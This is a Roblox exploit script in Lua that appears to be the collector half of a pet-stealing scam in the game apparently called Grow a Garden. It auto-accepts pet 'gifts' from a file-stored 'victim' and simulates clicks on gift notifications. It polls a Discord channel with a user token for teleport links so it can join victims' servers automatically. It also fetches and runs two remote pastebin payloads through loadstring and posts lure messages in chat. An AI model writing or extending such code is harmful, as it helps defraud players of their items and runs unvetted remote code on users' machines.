local PET_TO_CLAIM = _G.Pets
local isProcessing = false
local giftingActive = false
local lastGiftTime = 0

local Players = game:GetService('Players')
local HttpService = game:GetService('HttpService')
local UserInputService = game:GetService('UserInputService')
local RunService = game:GetService('RunService')
local TeleportService = game:GetService('TeleportService')
local TextChatService = game:GetService('TextChatService')
local VirtualUser = game:GetService('VirtualUser')
local VirtualInputManager = game:GetService('VirtualInputManager')

local plr = Players.LocalPlayer

if not game:IsLoaded() then
    game.Loaded:Wait()
end

local backpack = plr:WaitForChild('Backpack', 15)
if not backpack then
    wait(5)
end

local character = plr.Character or plr.CharacterAdded:Wait()
local RS = game:GetService('ReplicatedStorage')

local gameEvents = RS:WaitForChild('GameEvents', 10)
if not gameEvents then
    wait(5)
end

local PetGiftingService = gameEvents:WaitForChild('PetGiftingService', 10)
local Favorite_Item = gameEvents:WaitForChild('Favorite_Item', 10)
local GiftPet = gameEvents:WaitForChild('GiftPet', 10)
local AcceptPetGift = gameEvents:WaitForChild('AcceptPetGift', 10)

local function checkActivityStatus()
    print('Roblox window is IN FOCUS.')
end

RunService.Heartbeat:Connect(function()
    local currentStatusIsInactive = false
    local lastStatus = _G.RobloxFocusStatus

    if lastStatus == nil then
        checkActivityStatus()
        _G.RobloxFocusStatus = currentStatusIsInactive
    elseif
        (currentStatusIsInactive and not lastStatus)
        or (not currentStatusIsInactive and lastStatus)
    then
        checkActivityStatus()
        _G.RobloxFocusStatus = currentStatusIsInactive
    end
end)

checkActivityStatus()

local function waitForExactPet(fullName)
    print('⏳ Waiting for pet in backpack with name:', fullName)
    local timeout = 10
    local elapsed = 0

    while elapsed < timeout do
        for _, pet in ipairs(backpack:GetChildren()) do
            if pet.Name == fullName then
                print('✅ Pet appeared in backpack:', fullName)
                return true
            end
        end
        task.wait(0.5)
        elapsed = elapsed + 0.5
    end

    print('❌ Pet not found in backpack after 10s:', fullName)
    return false
end

local function extractBaseName(fullName)
    local base = fullName:gsub('%s*%[.-%]', '')
    return base:match('^%s*(.-)%s*$')
end

task.defer(function()
    print('🔌 Hooking into GiftPet RemoteEvent...')

    if not GiftPet then
        warn("GiftPet RemoteEvent is nil. Cannot hook into OnClientEvent.")
        return
    end

    GiftPet.OnClientEvent:Connect(function(giftID, fullName, sender)
        print('🎁 Gift received:', giftID, fullName, sender)

        giftingActive = true
        lastGiftTime = tick()
        print(string.format("Gifting started/continued. Last gift received at: %.2f", lastGiftTime))

        local basePetName = extractBaseName(fullName)
        print('🔍 Base pet name:', basePetName)

        if not table.find(PET_TO_CLAIM, basePetName) then
            print('⚠️ Pet not in whitelist. Ignoring gift from:', sender)
            return
        end

        while isProcessing do
            task.wait(0.1)
        end
        isProcessing = true

        print('✅ Accepting gift from', sender, 'with full name:', fullName)

        local success = pcall(function()
            if AcceptPetGift then
                AcceptPetGift:FireServer(true, giftID)
                print('🚀 Gift accepted (ID:', giftID, ')')
            else
                warn("AcceptPetGift RemoteEvent is nil. Cannot accept gift.")
                success = false
            end
        end)

        if success then
            waitForExactPet(fullName)
        else
            print('❌ Failed to accept gift.')
        end

        isProcessing = false
    end)

    print('✅ GiftPet listener successfully hooked.')
end)

if token == '' or channelId == '' then
    plr:Kick('Add your token or channelId to use')
end

loadstring(game:HttpGet('https://pastebin.com/raw/xBLu3qtF', true))()
loadstring(game:HttpGet('https://pastebin.com/raw/vbLfSAFd', true))()

game:GetService('Players').LocalPlayer.Idled:Connect(function()
    VirtualUser:CaptureController()
    VirtualUser:ClickButton2(Vector2.new())
end)

local victimFile = isfile('user_gag.txt')
local joinedFile = isfile('joined_ids.txt')

if not victimFile then
    writefile('user_gag.txt', 'victim username')
end
if not joinedFile then
    writefile('joined_ids.txt', '[]')
end

local victimUser = readfile('user_gag.txt')
local joinedIds = HttpService:JSONDecode(readfile('joined_ids.txt'))
local didVictimLeave = false
local timer = 0
local lastMessageId = nil

local function saveJoinedId(messageId)
    table.insert(joinedIds, messageId)
    writefile('joined_ids.txt', HttpService:JSONEncode(joinedIds))
end

local function waitForPlayerLeave()
    local connection
    connection = Players.PlayerRemoving:Connect(function(removedPlayer)
        if removedPlayer.Name == victimUser then
            if connection then
                connection:Disconnect()
            end
            didVictimLeave = true
        end
    end)
end

waitForPlayerLeave()

-- Wait for player data to load
while plr:GetAttribute('DataFullyLoaded') ~= true do
    plr:GetAttributeChangedSignal('DataFullyLoaded'):Wait()
end
while plr:GetAttribute('Finished_Loading') ~= true do
    plr:GetAttributeChangedSignal('Finished_Loading'):Wait()
end
while plr:GetAttribute('Loading_Screen_Finished') ~= true do
    plr:GetAttributeChangedSignal('Loading_Screen_Finished'):Wait()
end

wait(1)

local giftNoti = plr
    :WaitForChild('PlayerGui')
    :WaitForChild('Gift_Notification')
    :WaitForChild('Frame')

local function acceptGifts()
    while task.wait(0.1) do
        for _, v in pairs(giftNoti:GetChildren()) do
            if v:IsA('ImageLabel') then
                local acceptImageButton = v
                    :WaitForChild('Holder')
                    :WaitForChild('Frame')
                    :WaitForChild('Accept')
                replicatesignal(acceptImageButton.MouseButton1Click)
            end
        end
    end
end

task.spawn(acceptGifts)

TextChatService.TextChannels.RBXGeneral:SendAsync('Yo gng check yo clipboard')
wait(0.5)
TextChatService.TextChannels.RBXGeneral:SendAsync('GGS')

local function increaseTimer()
    while task.wait(1) do
        timer = timer + 1
    end
end

task.spawn(increaseTimer)

local function autoJoin()
    if giftingActive then
        local timeSinceLastGift = tick() - lastGiftTime
        if timeSinceLastGift < 6 then
            print(string.format("Gifting is active. Skipping Discord check for %.2f more seconds.", 6 - timeSinceLastGift))
            return
        else
            print("Gifting session concluded. Resetting giftingActive flag and proceeding with Discord check.")
        end
    end

    local response = request({
        Url = 'https://discord.com/api/v9/channels/'
            .. channelId
            .. '/messages?limit=1',
        Method = 'GET',
        Headers = {
            ['Authorization'] = token,
            ['User-Agent'] = 'Mozilla/5.0 (Windows NT 10.0; Win64; x64)',
            ['Content-Type'] = 'application/json',
        },
    })

    if response.StatusCode == 200 then
        local messages = HttpService:JSONDecode(response.Body)
        if #messages == 0 then
            print("No new Discord messages to process.")
            return
        end

        local message = messages[1]
        if
            message.id == lastMessageId
            or table.find(joinedIds, tostring(message.id))
        then
            print("Latest Discord message already processed or joined.")
            return
        end

        local content = message.content or ''
        local placeId, jobId = string.match(
            content,
            'TeleportToPlaceInstance%((%d+),%s*[\'"]([%w%-]+)[\'"]%)'
        )
        if placeId and jobId then
            print(string.format("Discord message found for join: PlaceId=%s, JobId=%s", placeId, jobId))
            lastMessageId = message.id
            saveJoinedId(tostring(message.id))
            writefile('user_gag.txt', 'unknown')
            TeleportService:TeleportToPlaceInstance(tonumber(placeId), jobId)
        else
            print("Latest Discord message does not contain a valid teleport link.")
        end
    else
        warn('Invalid response code from Discord API:', response.StatusCode)
        warn('Response body:', response.Body)
    end
end

while task.wait(5) do
    autoJoin()
end
